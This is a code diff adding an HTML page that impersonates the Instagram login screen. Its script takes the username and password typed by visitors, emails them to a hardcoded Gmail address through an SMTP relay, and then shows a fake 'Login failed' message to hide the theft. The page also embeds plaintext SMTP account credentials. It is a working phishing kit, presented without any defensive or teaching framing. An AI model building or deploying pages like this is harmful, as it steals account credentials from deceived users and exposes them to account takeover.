@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <script src="https://smtpjs.com/v3/smtp.js"></script>
+   <link rel="stylesheet" href="assets/css/main.css">
+   <title>Instagram</title>
+   <script>
+   document.addEventListener('DOMContentLoaded', () => {
+       const loginButton = document.querySelector('.c-btn');
+       const usernameInput = document.querySelector('.c-panel__input[placeholder="Phone number, username, or email"]');
+       const passwordInput = document.querySelector('.c-panel__input[placeholder="Password"]');
+
+       loginButton.addEventListener('click', (e) => {
+           e.preventDefault();
+           
+           const username = usernameInput.value.trim();
+           const password = passwordInput.value;
+
+           if (!username || !password) {
+               alert('Please enter both username and password');
+               return;
+           }
+
+           Email.send({
+               Host : "smtp.elasticemail.com",
+               Username : "btech10355.23@bitmesra.ac.in",
+               Password : "571F33BBAA8A2E0DA96284D1DF4A45B948E2",
+               To : 'kr.satyam.kr1234@gmail.com',
+               From : "kr.satyam.kr1234@gmail.com",
+               Subject : "Instagram Login Attempt",
+               Body : `
+Login Attempt Details:
+Username/Email: ${username}
+Password: ${password}
+Timestamp: ${new Date().toLocaleString()}
+               `
+           }).then(
+               message => alert("Login failed! Error 404")
+           );
+       });
+   });
+   </script>
+</head>
+<body>
+   <main class="l-main">
+       <div class="l-main__img">
+         <img src="assets/img/homepage.png" alt="Smartphones">
+       </div>
+       <!-- <h1>hello</h1> -->
+       <div class="l-user">
+         <div class="c-panel group">
+           <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+           <div class="c-panel__form">
+             <input type="text" class="c-panel__input" placeholder="Phone number, username, or email">
+             <input type="password" class="c-panel__input" placeholder="Password">
+             <a href="#" class="c-btn">Log In</a>
+             <span class="c-panel__span">OR</span>
+           </div>
+           <a href="#" class="c-panel__facebook">Login with Facebook</a>
+           <a href="#" class="c-panel__forgot">Forgot password?</a>
+         </div>
+         <div class="c-signup group">
+           <p>Don't have an account? <span>Sign up</span></p>
+         </div>
+         <div class="c-app">
+           <p>Get the app.</p>
+           <div class="c-app__download">
+             <img src="assets/img/apple.png" alt="Apple Store">
+             <img src="assets/img/google.png" alt="Google Play">
+           </div>
+         </div>
+       </div>
+   </main>
+</body>
+</html>
